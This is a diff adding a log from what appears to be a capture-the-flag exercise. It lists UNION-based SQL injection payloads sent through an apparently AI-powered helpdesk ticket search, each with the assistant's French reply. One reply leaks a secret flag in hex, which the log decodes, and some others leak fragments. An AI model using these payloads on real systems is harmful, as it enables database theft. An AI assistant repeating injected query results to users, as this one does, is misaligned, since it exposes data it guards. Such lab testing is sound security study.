@@ -1,0 +1,54 @@
+
+
+##### hex(flag) #####
+PAYLOAD: %' UNION SELECT 'ZZ1','ZZ2','ZZ3',hex(flag) FROM secret_flags --
+REPLY: Je viens de rechercher les tickets avec le mot-clé que vous avez fourni. Voici les résultats :
+
+- T-1001 : Ecran noir - Problème : Mon ordinateur ne montre rien après l'authentification. Le câble semble fonctionnel.
+- T-1002 : Accès partagé - Problème : Je veux accéder au dossier partagé Finance pour la fin de mois.
+- T-ZZ1 : Problème crypté - Résultat : 4350457B3061616433373261356332397D
+
+Il semble qu'il y ait un problème crypté dans un ticket. Le nombre hexadécimal fourni pourrait être une partie de la valeur de la variable 'flag'.
+TOKENS: []
+HEX-DECODE: 4350457B3061616433373261356332397D ... -> CPE{0aad372a5c29}
+
+
+##### quote(flag) #####
+PAYLOAD: %' UNION SELECT 'ZZ1','ZZ2','ZZ3',quote(flag) FROM secret_flags --
+REPLY: Il semble qu'il y ait une entrée dans vos résultats de recherche qui pourrait être suspecte. Elle contient un message cryptique qui pourrait être une tentative de récupération de mot de passe. Veuillez noter que l'entrée avec les valeurs ZZ1, ZZ2, ZZ3 et ZZ3 contient une chaîne de caractères qui semble être une valeur de flag, probablement liée à une sécurité interne. Pour votre sécurité, je vous recommande de vérifier cette entrée et de contacter votre administrateur IT si nécessaire.
+TOKENS: []
+
+
+##### length(flag) #####
+PAYLOAD: %' UNION SELECT 'ZZ1','ZZ2','ZZ3',length(flag) FROM secret_flags --
+REPLY: Je n'ai pas réussi à trouver de tickets correspondant à votre requête. Cependant, j'ai identifié une entrée dans votre base de données des tickets qui semble être liée à votre requête. Il s'agit d'un ticket avec le numéro T-1001, qui concerne un problème d'écran noir après le login. Pour plus d'informations, vous pouvez consulter le ticket [T-1001](T-1001).
+TOKENS: []
+
+
+##### substr 1-8 #####
+PAYLOAD: %' UNION SELECT 'ZZ1','ZZ2','ZZ3',substr(flag,1,8) FROM secret_flags --
+REPLY: Je n'ai trouvé aucun ticket correspondant à votre recherche "%' UNION SELECT 'ZZ1','ZZ2','ZZ3',substr(flag,1,8) FROM secret_flags --". Les tickets existants concernent plutôt des problèmes d'accès à l'écran ou des demandes d'accès à des dossiers partagés. Pour le problème de l'écran noir, vous pouvez essayer de vérifier les câbles, de vérifier si votre matériel est bien branché et si votre système d'exploitation est bien configuré. Pour d'autres problèmes, veuillez contacter votre responsable IT.
+TOKENS: []
+
+
+##### substr 9-16 #####
+PAYLOAD: %' UNION SELECT 'ZZ1','ZZ2','ZZ3',substr(flag,9,8) FROM secret_flags --
+REPLY: Je n'ai pas réussi à trouver de tickets correspondant à votre recherche. Cependant, j'ai noté que vous avez un ticket avec les identifiants ZZ1, ZZ2, ZZ3 et 372a5c29. Pourriez-vous en savoir plus sur ce ticket ?
+TOKENS: []
+
+
+##### substr 17-24 #####
+PAYLOAD: %' UNION SELECT 'ZZ1','ZZ2','ZZ3',substr(flag,17,8) FROM secret_flags --
+REPLY: Je n'ai pas réussi à trouver de tickets correspondant à votre requête car le mot-clé utilisé contient une commande SQL qui a été interprétée et n'a pas renvoyé de résultats. Cependant, il semble qu'il y ait eu une erreur dans la recherche. Veuillez vérifier votre mot-clé et essayez à nouveau.
+TOKENS: []
+
+
+##### substr 25-32 #####
+PAYLOAD: %' UNION SELECT 'ZZ1','ZZ2','ZZ3',substr(flag,25,8) FROM secret_flags --
+REPLY: Je n'ai pas réussi à trouver de tickets correspondant à votre recherche. Cependant, voici quelques tickets qui pourraient être pertinents :
+
+- Ticket T-1001: Problème avec l'écran noir après le login. Le câble semble fonctionnel.
+- Ticket T-1002: Accès partagé. L'utilisateur bmeier1 a besoin d'accès au dossier partagé Finance pour la fin de mois.
+
+Il n'y a pas de ticket correspondant à votre requête spécifiquement.
+TOKENS: []
